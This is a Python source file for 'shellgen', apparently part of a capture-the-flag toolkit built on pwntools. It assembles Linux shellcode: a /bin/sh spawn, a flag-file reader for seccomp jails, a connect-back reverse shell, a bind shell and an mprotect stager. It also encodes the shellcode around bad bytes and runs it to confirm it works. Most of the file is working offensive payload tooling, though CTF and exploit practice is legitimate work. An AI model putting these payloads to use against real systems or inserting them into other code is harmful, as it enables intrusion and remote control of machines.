"""shellgen: build shellcode, avoid bad bytes, and prove it runs.

    shellgen sh                            # execve("/bin/sh")
    shellgen orw /flag.txt                 # open, read, write: for seccomp jails
    shellgen sh --bad 000a20 --test
    shellgen sh --arch i386 --format python
"""

from __future__ import annotations

import sys

from ctftools.core import term
from ctftools.core.cliutil import add_common_args, apply_output_flags, base_parser, fail
from ctftools.core.report import Report

PAYLOADS = {
    "sh": "execve(\"/bin/sh\", 0, 0) — the usual goal",
    "orw": "open a file, read it, write it to stdout — works when execve is blocked",
    "cat": "the same as orw, built from shellcraft.cat",
    "exit": "exit(0) — a harmless payload for testing a jump",
    "connect": "connect back to host:port and give it a shell",
    "listen": "listen on a port and give the first connection a shell",
    "mprotect": "make the stack executable again, then jump to the next stage",
}


def build(kind: str, arch: str = "amd64", path: str = "/flag.txt",
          host: str = "127.0.0.1", port: int = 4444, address: int = 0) -> bytes:
    """Assemble one of the named payloads."""
    from pwnlib.context import context
    from pwnlib.asm import asm
    from pwnlib import shellcraft

    context.clear()
    context.arch = arch
    context.os = "linux"
    craft = shellcraft

    if kind == "sh":
        source = craft.sh()
    elif kind in ("orw", "cat"):
        # open + read + write to stdout: the payload for a jail that kills execve.
        source = craft.cat(path)
    elif kind == "exit":
        source = craft.exit(0)
    elif kind == "connect":
        source = craft.connect(host, port) + craft.dupsh("rbp" if arch == "amd64" else "ebp")
    elif kind == "listen":
        source = craft.listen(port) + craft.dupsh("rbp" if arch == "amd64" else "ebp")
    elif kind == "mprotect":
        page = address or 0x7FFFFFFFE000
        source = craft.mprotect(page & ~0xFFF, 0x2000, 7)
    else:
        raise ValueError(f"unknown payload {kind!r}")

    return asm(source)


def encode_without(shellcode: bytes, bad: bytes, arch: str = "amd64") -> tuple[bytes, str]:
    """Re-encode *shellcode* so that no byte of *bad* appears in it."""
    if not bad or not any(b in shellcode for b in bad):
        return shellcode, "none needed"
    from pwnlib.context import context
    from pwnlib.encoders import encode

    context.clear()
    context.arch = arch
    context.os = "linux"
    context.log_level = "error"
    try:
        return bytes(encode(shellcode, bad)), "pwnlib xor encoder"
    except Exception as exc:
        reason = str(exc).splitlines()[0] if str(exc) else type(exc).__name__
        raise RuntimeError(
            f"no encoder can avoid {bad.hex()} on {arch}: {reason}. "
            "On x86-64 the REX prefix 0x48 is in nearly every instruction, so it cannot be "
            "excluded; write the payload by hand or stage it in two parts"
        )


def test_run(shellcode: bytes, arch: str = "amd64", timeout: float = 5.0) -> tuple[bool, str]:
    """Actually execute the shellcode and see whether it did its job."""
    from pwnlib.context import context
    from pwnlib.runner import run_shellcode

    context.clear()
    context.arch = arch
    context.os = "linux"
    context.log_level = "error"

    try:
        io = run_shellcode(shellcode)
        io.sendline(b"echo SHELLGEN_OK")
        data = io.recvrepeat(min(timeout, 2.0))
        io.close()
    except EOFError:
        return True, "it ran and the process exited without opening a shell"
    except Exception as exc:
        return False, f"could not run it: {exc or type(exc).__name__}"

    if b"SHELLGEN_OK" in data:
        return True, "a shell came back and ran a command"
    if data.strip():
        return True, f"it ran and produced output: {data[:80]!r}"
    return False, "the shellcode ran but produced nothing"


def test_orw(shellcode: bytes, path: str, arch: str = "amd64", timeout: float = 5.0) -> tuple[bool, str]:
    """Run an open/read/write payload and check it printed the file."""
    import os
    import tempfile

    from pwnlib.context import context
    from pwnlib.runner import run_shellcode

    context.clear()
    context.arch = arch
    context.os = "linux"
    context.log_level = "error"

    if not os.path.exists(path):
        return False, f"there is no {path} here to read; test it where the file exists"

    try:
        io = run_shellcode(shellcode)
        data = io.recvrepeat(min(timeout, 2.0))
        io.close()
    except Exception as exc:
        return False, f"could not run it: {exc}"

    if data.strip():
        return True, f"it read the file: {data[:80]!r}"
    return False, "nothing was printed"


def formats(shellcode: bytes) -> dict:
    """The shellcode in every form worth pasting somewhere."""
    return {
        "raw_hex": shellcode.hex(),
        "python": repr(shellcode),
        "c": "".join(f"\\x{b:02x}" for b in shellcode),
        "escaped": "".join(f"\\x{b:02x}" for b in shellcode),
    }


def generate(kind: str, arch: str = "amd64", bad: bytes = b"", path: str = "/flag.txt",
             host: str = "127.0.0.1", port: int = 4444, address: int = 0,
             test: bool = False, max_size: int | None = None) -> Report:
    report = Report(tool="shellgen", target=kind)

    shellcode = build(kind, arch, path=path, host=host, port=port, address=address)
    original_size = len(shellcode)
    encoder = "none needed"
    if bad:
        shellcode, encoder = encode_without(shellcode, bad, arch)

    remaining = sorted({b for b in bad if b in shellcode})
    report.data.update({
        "payload": kind,
        "arch": arch,
        "size": len(shellcode),
        "size_before_encoding": original_size,
        "encoder": encoder,
        "bad_bytes": bad.hex(),
        "bad_bytes_remaining": [f"{b:#04x}" for b in remaining],
        **formats(shellcode),
    })

    sec = report.section("Shellcode")
    sec.add(f"  {term.c(kind, 'bold')} for {arch}: {len(shellcode)} bytes"
            + (f" (was {original_size} before encoding)" if encoder != "none needed" else ""))
    if bad:
        sec.add(f"  {term.dim('bad bytes:')} {bad.hex()}  {term.dim('encoder:')} {encoder}")
        if remaining:
            sec.add("  " + term.bad(f"still contains: {', '.join(f'{b:#04x}' for b in remaining)}"))
        else:
            sec.add("  " + term.good("no bad bytes remain"))
    if max_size is not None:
        fits = len(shellcode) <= max_size
        sec.add(f"  {term.dim('size limit:')} {max_size} - "
                + (term.good("fits") if fits else term.bad(f"{len(shellcode) - max_size} bytes too long")))
        report.data["fits"] = fits
    sec.add("")
    sec.add("  " + term.dim("python:"))
    sec.add(f"    shellcode = {shellcode!r}")
    sec.add("  " + term.dim("hex:"))
    sec.add(f"    {shellcode.hex()}")

    if test:
        verify = report.section("Test run")
        if kind in ("orw", "cat"):
            ok, detail = test_orw(shellcode, path, arch)
        elif kind in ("connect", "listen", "mprotect"):
            ok, detail = False, "not tested: this payload needs a network peer or a staged second payload"
        else:
            ok, detail = test_run(shellcode, arch)
        report.data["tested"] = ok
        report.data["test_detail"] = detail
        verify.add("  " + (term.good("works") if ok else term.warn("not proven")) + f"  {detail}")

    return report


def build_parser():
    parser = base_parser("shellgen", "Generate shellcode, encode around bad bytes, and test it.")
    parser.add_argument("payload", choices=sorted(PAYLOADS), help="which payload to build")
    parser.add_argument("path", nargs="?", default="/flag.txt", help="file to read for orw/cat (default: /flag.txt)")
    parser.add_argument("--arch", default="amd64", choices=["amd64", "i386", "arm", "aarch64"],
                        help="target architecture (default: amd64)")
    parser.add_argument("--bad", default="", help="bad bytes as hex, e.g. 000a20")
    parser.add_argument("--max-size", type=int, help="fail if the shellcode is longer than this")
    parser.add_argument("--host", default="127.0.0.1", help="host for connect (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=4444, help="port for connect/listen (default: 4444)")
    parser.add_argument("--address", type=lambda v: int(v, 0), default=0, help="page address for mprotect")
    parser.add_argument("--test", action="store_true", help="run the shellcode and check it worked")
    parser.add_argument("--raw", action="store_true", help="write the raw bytes to stdout and nothing else")
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)

    try:
        bad = bytes.fromhex(args.bad.replace("0x", "").replace("\\x", "").replace(" ", ""))
    except ValueError:
        fail(f"--bad must be hex, got {args.bad!r}")

    try:
        report = generate(
            args.payload, arch=args.arch, bad=bad, path=args.path, host=args.host,
            port=args.port, address=args.address, test=args.test, max_size=args.max_size,
        )
    except RuntimeError as exc:
        fail(str(exc))

    if args.raw:
        sys.stdout.buffer.write(bytes.fromhex(report.data["raw_hex"]))
        return 0

    report.emit(as_json=args.json)
    if report.data.get("bad_bytes_remaining"):
        return 1
    if args.max_size is not None and not report.data.get("fits"):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
